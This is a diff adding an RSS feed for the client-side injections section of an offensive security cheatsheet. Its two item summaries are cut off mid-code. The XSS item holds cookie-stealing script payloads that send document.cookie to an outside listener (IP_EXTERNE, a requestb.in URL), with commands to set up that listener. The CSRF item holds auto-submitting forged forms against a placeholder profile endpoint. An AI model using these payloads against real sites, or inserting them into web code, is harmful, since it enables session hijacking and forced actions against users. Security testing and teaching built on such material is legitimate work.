@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Client Side Injections on Offensive Security Cheatsheet</title>
+    <link>/web-attacks/client-side-injections/</link>
+    <description>Recent content in Client Side Injections on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/web-attacks/client-side-injections/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>XSS Injections</title>
+      <link>/web-attacks/client-side-injections/xss/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/client-side-injections/xss/</guid>
+      <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot 
+Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this 
+Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; 
+Payloads # Document.location &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &amp;#39;http://requestb.in/XXXXXX?cookies =&amp;#39; + document.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injections</title>
+      <link>/web-attacks/client-side-injections/csrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/client-side-injections/csrf/</guid>
+      <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt;# Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;# Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
+    </item>
+    
+  </channel>
+</rss>
